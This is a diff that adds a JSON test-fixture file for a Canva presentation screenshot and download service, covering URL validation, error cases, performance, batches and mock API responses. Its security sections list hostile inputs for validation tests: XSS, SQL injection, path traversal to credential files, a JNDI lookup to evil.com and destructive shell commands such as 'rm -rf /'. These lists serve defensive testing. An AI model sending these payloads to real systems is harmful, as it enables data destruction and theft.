@@ -1,0 +1,361 @@
+{
+  "validUrls": {
+    "standard": "https://www.canva.com/design/DAGutBPLlkA/view",
+    "withParams": "https://www.canva.com/design/DAGutBPLlkA/view?utm_content=test&utm_source=share",
+    "edit": "https://www.canva.com/design/DAGutBPLlkA/edit",
+    "share": "https://www.canva.com/design/DAGutBPLlkA/share/preview",
+    "shortForm": "https://canva.com/design/DAGutBPLlkA/view",
+    "withQuery": "https://www.canva.com/design/DAGutBPLlkA/view?ref=1&source=homepage"
+  },
+  
+  "invalidUrls": [
+    "not-a-url",
+    "https://google.com",
+    "https://www.canva.com/invalid",
+    "https://www.canva.com/design/",
+    "https://www.canva.com/design//view",
+    "ftp://canva.com/design/test/view",
+    "",
+    "javascript:alert('xss')",
+    "data:text/html,<script>alert('xss')</script>"
+  ],
+  
+  "edgeCaseUrls": {
+    "specialChars": "https://www.canva.com/design/測試-123_ABC/view",
+    "veryLong": "https://www.canva.com/design/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/view",
+    "singleChar": "https://www.canva.com/design/A/view",
+    "mixedCase": "https://www.canva.com/design/MiXeD123/view",
+    "underscores": "https://www.canva.com/design/TEST_WITH_UNDERSCORES/view",
+    "numbers": "https://www.canva.com/design/1234567890/view"
+  },
+  
+  "maliciousInputs": [
+    "<script>alert('xss')</script>",
+    "\"; DROP TABLE users; --",
+    "../../../etc/passwd",
+    "javascript:alert('xss')",
+    "%3Cscript%3Ealert('xss')%3C/script%3E",
+    "' OR '1'='1",
+    "{{7*7}}",
+    "${jndi:ldap://evil.com/a}",
+    "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+  ],
+  
+  "testPresentations": {
+    "small": {
+      "url": "https://www.canva.com/design/SMALL_PRES/view",
+      "pageCount": 3,
+      "title": "Small Test Presentation",
+      "estimatedSize": "2MB",
+      "processingTime": 15
+    },
+    "medium": {
+      "url": "https://www.canva.com/design/MEDIUM_PRES/view",
+      "pageCount": 10,
+      "title": "Medium Test Presentation",
+      "estimatedSize": "8MB",
+      "processingTime": 45
+    },
+    "large": {
+      "url": "https://www.canva.com/design/LARGE_PRES/view",
+      "pageCount": 25,
+      "title": "Large Test Presentation",
+      "estimatedSize": "20MB",
+      "processingTime": 120
+    },
+    "xlarge": {
+      "url": "https://www.canva.com/design/XLARGE_PRES/view",
+      "pageCount": 50,
+      "title": "Extra Large Test Presentation",
+      "estimatedSize": "40MB",
+      "processingTime": 300
+    }
+  },
+  
+  "errorScenarios": {
+    "networkTimeout": {
+      "url": "https://www.canva.com/design/TIMEOUT_TEST/view",
+      "errorType": "NETWORK_TIMEOUT",
+      "message": "Request timeout",
+      "shouldRetry": true
+    },
+    "accessDenied": {
+      "url": "https://www.canva.com/design/PRIVATE_PRES/view",
+      "errorType": "ACCESS_DENIED",
+      "message": "Access denied: Private presentation",
+      "shouldRetry": false
+    },
+    "notFound": {
+      "url": "https://www.canva.com/design/NOT_FOUND/view",
+      "errorType": "NOT_FOUND",
+      "message": "Presentation not found",
+      "shouldRetry": false
+    },
+    "serviceUnavailable": {
+      "url": "https://www.canva.com/design/SERVICE_DOWN/view",
+      "errorType": "SERVICE_UNAVAILABLE",
+      "message": "Service temporarily unavailable",
+      "shouldRetry": true
+    },
+    "rateLimited": {
+      "url": "https://www.canva.com/design/RATE_LIMITED/view",
+      "errorType": "RATE_LIMITED",
+      "message": "Too many requests",
+      "shouldRetry": true
+    }
+  },
+  
+  "performanceTestData": {
+    "resolutions": [
+      {
+        "name": "480p",
+        "width": 854,
+        "height": 480,
+        "expectedTime": 3000,
+        "maxMemory": "200MB"
+      },
+      {
+        "name": "720p",
+        "width": 1280,
+        "height": 720,
+        "expectedTime": 5000,
+        "maxMemory": "300MB"
+      },
+      {
+        "name": "1080p",
+        "width": 1920,
+        "height": 1080,
+        "expectedTime": 10000,
+        "maxMemory": "500MB"
+      },
+      {
+        "name": "4K",
+        "width": 3840,
+        "height": 2160,
+        "expectedTime": 20000,
+        "maxMemory": "1GB"
+      }
+    ],
+    
+    "qualityLevels": [
+      {
+        "name": "low",
+        "value": 50,
+        "compressionRatio": 0.7,
+        "expectedFileSize": "small"
+      },
+      {
+        "name": "medium",
+        "value": 75,
+        "compressionRatio": 0.8,
+        "expectedFileSize": "medium"
+      },
+      {
+        "name": "high",
+        "value": 90,
+        "compressionRatio": 0.9,
+        "expectedFileSize": "large"
+      },
+      {
+        "name": "maximum",
+        "value": 100,
+        "compressionRatio": 1.0,
+        "expectedFileSize": "largest"
+      }
+    ],
+    
+    "concurrencyLevels": [
+      {
+        "users": 1,
+        "expectedResponseTime": "100%",
+        "successRate": "100%",
+        "maxMemory": "500MB"
+      },
+      {
+        "users": 5,
+        "expectedResponseTime": "130%",
+        "successRate": "98%",
+        "maxMemory": "1GB"
+      },
+      {
+        "users": 10,
+        "expectedResponseTime": "150%",
+        "successRate": "95%",
+        "maxMemory": "2GB"
+      },
+      {
+        "users": 25,
+        "expectedResponseTime": "200%",
+        "successRate": "90%",
+        "maxMemory": "4GB"
+      }
+    ]
+  },
+  
+  "batchTestData": {
+    "smallBatch": {
+      "urls": [
+        "https://www.canva.com/design/BATCH_1/view",
+        "https://www.canva.com/design/BATCH_2/view",
+        "https://www.canva.com/design/BATCH_3/view"
+      ],
+      "expectedTime": 45,
+      "expectedSuccessRate": 1.0
+    },
+    "mediumBatch": {
+      "urls": [
+        "https://www.canva.com/design/BATCH_4/view",
+        "https://www.canva.com/design/BATCH_5/view",
+        "https://www.canva.com/design/BATCH_6/view",
+        "https://www.canva.com/design/BATCH_7/view",
+        "https://www.canva.com/design/BATCH_8/view"
+      ],
+      "expectedTime": 120,
+      "expectedSuccessRate": 0.95
+    },
+    "mixedBatch": {
+      "urls": [
+        "https://www.canva.com/design/VALID_1/view",
+        "invalid-url",
+        "https://www.canva.com/design/VALID_2/view",
+        "https://www.canva.com/design/PRIVATE_X/view",
+        "https://www.canva.com/design/VALID_3/view"
+      ],
+      "expectedTime": 90,
+      "expectedSuccessRate": 0.6,
+      "expectedErrors": ["INVALID_URL", "ACCESS_DENIED"]
+    }
+  },
+  
+  "accessibilityTestData": {
+    "colorContrast": {
+      "minimumRatio": 4.5,
+      "preferredRatio": 7.0,
+      "testElements": ["button", "link", "text", "input"]
+    },
+    "keyboardNavigation": {
+      "testSequence": ["Tab", "Shift+Tab", "Enter", "Space", "Escape"],
+      "focusableElements": ["input", "button", "select", "textarea", "link"]
+    },
+    "screenReader": {
+      "requiredAttributes": ["aria-label", "aria-describedby", "role", "alt"],
+      "landmarkRoles": ["main", "nav", "complementary", "contentinfo"]
+    }
+  },
+  
+  "securityTestData": {
+    "inputValidation": {
+      "sqlInjection": [
+        "'; DROP TABLE users; --",
+        "1' OR '1'='1",
+        "admin'; DELETE FROM users; --"
+      ],
+      "xssPayloads": [
+        "<script>alert('xss')</script>",
+        "javascript:alert('xss')",
+        "<img src='x' onerror='alert(1)'>"
+      ],
+      "pathTraversal": [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "....//....//....//etc/passwd"
+      ],
+      "commandInjection": [
+        "; rm -rf /",
+        "| cat /etc/passwd",
+        "& del /f /q c:\\*.*"
+      ]
+    },
+    
+    "rateLimiting": {
+      "requestsPerMinute": 10,
+      "requestsPerHour": 100,
+      "burstLimit": 5,
+      "testThreshold": 15
+    },
+    
+    "dataProtection": {
+      "tempFileLifetime": 1800,
+      "logDataRetention": 30,
+      "encryptionRequired": true,
+      "piiFields": ["url", "metadata"]
+    }
+  },
+  
+  "integrationTestEndpoints": {
+    "health": {
+      "path": "/api/health",
+      "method": "GET",
+      "expectedStatus": 200,
+      "expectedResponse": {"status": "ok"}
+    },
+    "parseUrl": {
+      "path": "/api/parse-url",
+      "method": "POST",
+      "expectedStatus": 200,
+      "payload": {"url": "https://www.canva.com/design/TEST/view"}
+    },
+    "screenshot": {
+      "path": "/api/screenshot",
+      "method": "POST",
+      "expectedStatus": 200,
+      "payload": {
+        "url": "https://www.canva.com/design/TEST/view",
+        "options": {"width": 1920, "height": 1080}
+      }
+    },
+    "download": {
+      "path": "/api/download",
+      "method": "POST",
+      "expectedStatus": 200,
+      "payload": {
+        "url": "https://www.canva.com/design/TEST/view",
+        "format": "pdf",
+        "quality": "high"
+      }
+    }
+  },
+  
+  "mockResponses": {
+    "successfulParse": {
+      "designId": "DAGutBPLlkA",
+      "designType": "presentation",
+      "isPublic": true,
+      "hasEditAccess": false,
+      "pageCount": 5,
+      "title": "Test Presentation"
+    },
+    
+    "successfulScreenshot": {
+      "success": true,
+      "data": "base64-encoded-image-data",
+      "metadata": {
+        "width": 1920,
+        "height": 1080,
+        "format": "png",
+        "size": 1048576
+      }
+    },
+    
+    "successfulDownload": {
+      "success": true,
+      "downloadUrl": "/api/download/abc123",
+      "metadata": {
+        "pageCount": 5,
+        "fileSize": 5242880,
+        "format": "pdf",
+        "processingTime": 12000
+      }
+    },
+    
+    "errorResponse": {
+      "success": false,
+      "error": {
+        "type": "INVALID_URL",
+        "message": "The provided URL is not a valid Canva design URL",
+        "code": "E001",
+        "timestamp": "2024-01-15T10:30:00Z"
+      }
+    }
+  }
+}
